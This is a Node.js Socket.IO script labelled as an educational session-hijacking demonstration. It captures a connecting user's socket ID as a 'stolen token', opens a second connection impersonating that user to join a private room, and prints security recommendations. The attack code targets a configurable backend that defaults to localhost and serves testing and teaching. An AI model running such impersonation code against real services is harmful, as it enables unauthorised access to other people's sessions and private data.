/**
 * Session Hijacking Attack Demonstration
 * 
 * This script demonstrates how session tokens can be stolen and reused
 * to impersonate legitimate users in a vulnerable system.
 * 
 * ⚠️ FOR EDUCATIONAL PURPOSES ONLY
 */

const io = require('socket.io-client');

const BACKEND_URL = process.env.BACKEND_URL || 'http://localhost:4000';
const TARGET_ROOM = 'private-room-' + Date.now();

console.log('═══════════════════════════════════════════════════');
console.log('🔴 SESSION HIJACKING ATTACK DEMONSTRATION');
console.log('═══════════════════════════════════════════════════\n');

console.log(`📡 Backend URL: ${BACKEND_URL}`);
console.log(`🎯 Target Room: ${TARGET_ROOM}\n`);

let stolenToken = null;
let legitimateSocket = null;

console.log('PHASE 1: Legitimate User Connection');
console.log('─────────────────────────────────────────────────\n');

// Step 1: Legitimate user connects
legitimateSocket = io(BACKEND_URL);

legitimateSocket.on('connect', () => {
    console.log('✅ Legitimate user connected');
    console.log(`👤 User ID: victim-user`);
    console.log(`🔑 Socket ID: ${legitimateSocket.id}\n`);

    // In a vulnerable system, the socket ID acts as a session token
    stolenToken = legitimateSocket.id;

    console.log('🔓 Session Token Captured!');
    console.log(`   Token: ${stolenToken}\n`);

    // Join a private room
    legitimateSocket.emit('join', {
        roomId: TARGET_ROOM,
        user: {
            id: 'victim-user',
            name: 'Legitimate User'
        }
    });

    console.log('📨 Joining private room...\n');
});

legitimateSocket.on('room-state', (state) => {
    console.log('✅ Legitimate user successfully joined room');
    console.log(`📊 Room participants: ${state.participants.length}\n`);

    // Wait a bit, then attempt hijack
    setTimeout(() => {
        console.log('\nPHASE 2: Attacker Hijack Attempt');
        console.log('─────────────────────────────────────────────────\n');
        attemptHijack();
    }, 2000);
});

function attemptHijack() {
    console.log('🎭 Attacker attempting to hijack session...');
    console.log(`🔑 Using stolen token: ${stolenToken}\n`);

    // Attacker tries to connect with stolen credentials
    const attackerSocket = io(BACKEND_URL, {
        query: {
            stolenToken: stolenToken,
            impersonate: 'victim-user'
        }
    });

    attackerSocket.on('connect', () => {
        console.log('✅ Attacker connected to server');
        console.log(`🎭 Attacker Socket ID: ${attackerSocket.id}\n`);

        // Try to join the same private room
        console.log('💀 Attempting to access private room...');
        attackerSocket.emit('join', {
            roomId: TARGET_ROOM,
            user: {
                id: 'attacker-' + Date.now(),
                name: 'Attacker (pretending to be victim)'
            }
        });
    });

    attackerSocket.on('room-state', (state) => {
        console.log('\n🚨 HIJACK SUCCESSFUL! 🚨');
        console.log('═══════════════════════════════════════════════════');
        console.log('Attacker gained unauthorized access to private room!');
        console.log('═══════════════════════════════════════════════════\n');

        console.log('📊 Room State:');
        console.log(`   Total participants: ${state.participants.length}`);
        state.participants.forEach(p => {
            console.log(`   - ${p.name} (${p.socketId})`);
        });
        console.log('');

        console.log('⚠️  VULNERABILITY CONFIRMED:');
        console.log('   ❌ No session validation');
        console.log('   ❌ No token expiration');
        console.log('   ❌ No user authentication');
        console.log('   ❌ Attacker can impersonate legitimate users\n');

        console.log('💡 SECURITY RECOMMENDATIONS:');
        console.log('   ✅ Implement JWT tokens with expiration');
        console.log('   ✅ Validate tokens on every request');
        console.log('   ✅ Use secure session management');
        console.log('   ✅ Implement user authentication\n');

        // Cleanup
        setTimeout(() => {
            console.log('🧹 Cleaning up...\n');
            legitimateSocket.disconnect();
            attackerSocket.disconnect();

            console.log('✅ Attack demonstration complete\n');
            process.exit(0);
        }, 3000);
    });

    attackerSocket.on('connect_error', (error) => {
        console.log('❌ Hijack attempt failed (connection error)');
        console.log(`   Error: ${error.message}\n`);

        console.log('✅ GOOD: Server rejected the hijack attempt');
        console.log('🛡️  Token validation appears to be working\n');

        legitimateSocket.disconnect();
        process.exit(0);
    });

    attackerSocket.on('error', (error) => {
        console.log('❌ Hijack attempt blocked by server');
        console.log(`   Reason: ${error}\n`);

        console.log('✅ GOOD: Server has security measures in place\n');

        legitimateSocket.disconnect();
        attackerSocket.disconnect();
        process.exit(0);
    });
}

legitimateSocket.on('connect_error', (error) => {
    console.error('❌ Connection Error:', error.message);
    process.exit(1);
});

console.log('⏳ Initializing attack demonstration...\n');
